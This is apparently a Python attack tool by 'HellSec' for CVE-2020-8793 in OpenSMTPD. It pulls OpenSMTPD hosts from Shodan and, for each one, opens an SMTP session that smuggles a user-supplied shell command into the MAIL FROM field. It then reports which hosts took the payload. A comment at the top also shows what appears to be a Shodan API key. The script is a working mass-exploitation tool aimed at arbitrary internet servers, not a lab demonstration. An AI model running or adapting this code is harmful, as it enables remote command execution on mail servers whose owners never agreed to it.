# Example Shodan Key : 4YPxT4aPnOnd7ba1tViLIYfjfj4V4bEN
# Made by HellSec

import time, sys, threading, shodan, requests

from socket import *
from colorama import Fore
from datetime import datetime

print (f'''{Fore.RED}
{Fore.WHITE}  ___                  {Fore.RED} ____  __  __ _____ ____  ____
{Fore.WHITE} / _ \ _ __   ___ _ __ {Fore.RED}/ ___||  \/  |_   _|  _ \|  _ \\
{Fore.WHITE}| | | | '_ \ / _ | '_ \\{Fore.RED}\___ \| |\/| | | | | |_) | | | |
{Fore.WHITE}| |_| | |_) |  __| | | |{Fore.RED}___) | |  | | | | |  __/| |_| |
{Fore.WHITE} \___/| .__/ \___|_| |_{Fore.RED}|____/|_|  |_| |_| |_|   |____/
{Fore.WHITE}      |_|

Creator  :  HellSec
CVE      :  2020-8793
CVE Link :  https://nvd.nist.gov/vuln/detail/CVE-2020-8793

===========================================================
''')

key = input('Shodan API Key : ')
api = shodan.Shodan(key)

payload = input('Payload : ')
port = 25

def exploit(ip:str, port:int):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(1)

    try:
        s.connect((ip, port))
        res = s.recv(1024)

        if 'OpenSMTPD' not in str(res):
            return 1

        s.send(b'HELO x\r\n')
        res = s.recv(1024)
        if '250' not in str(res):
            return 2

        s.send(bytes(f'MAIL FROM:<;{payload};>\r\n', 'utf-8'))
        res = s.recv(1024)
        if '250' not in str(res):
            return 3
    
        s.send(b'RCPT TO:<root>\r\n')
        s.recv(1024)
        s.send(b'DATA\r\n')
        s.recv(1024)
        s.send(b'\r\nxxx\r\n.\r\n')
        s.recv(1024)
        s.send(b'QUIT\r\n')
        a = s.recv(1024)
        return 4
    except:
        return 5
 
 
def main():
    count = 0
    now = datetime.now()
    current = now.strftime('%H:%M:%S')

    print(f'\n{Fore.WHITE}Starting OSMTPD At {current}...')
    try:
        print('Grabbing Targets...')
        results = api.search('OpenSMTPD')
        print(f'{Fore.GREEN}Started OSMTPD{Fore.WHITE}\n')
        print('===========================================================')
        for result in results['matches']:
            try:
                current = now.strftime('%H:%M:%S')
                ip = result["ip_str"]
                ip = ip.strip("\r\n")
                run = exploit(ip, port)
                if run == 4:
                    count += 1
                    print(f'{Fore.GREEN}[{current}]{Fore.WHITE} Payload Sent : {ip}{Fore.WHITE}')
                elif run == 1:
                    print(f'{Fore.YELLOW}[{current}]{Fore.WHITE} Non-OpenSMTPD Machine : {ip}{Fore.WHITE}')
                elif run == 2:
                    print(f'{Fore.RED}[{current}]{Fore.WHITE} Failed To Receive Heartbeat : {ip}{Fore.WHITE}')
                elif run == 3:
                    print(f'{Fore.RED}[{current}]{Fore.WHITE} Could Not Exucute Payload : {ip}{Fore.WHITE}')
                elif run == 5:
                    print(f'{Fore.BLUE}[{current}]{Fore.WHITE} Could Not Connect To Host : {ip}{Fore.WHITE}')
                else:
                    print('Exited')
                    exit()
            except KeyboardInterrupt as e:
                print(f'Exited')
    except KeyboardInterrupt as e:
        print(f'Exited')

main()
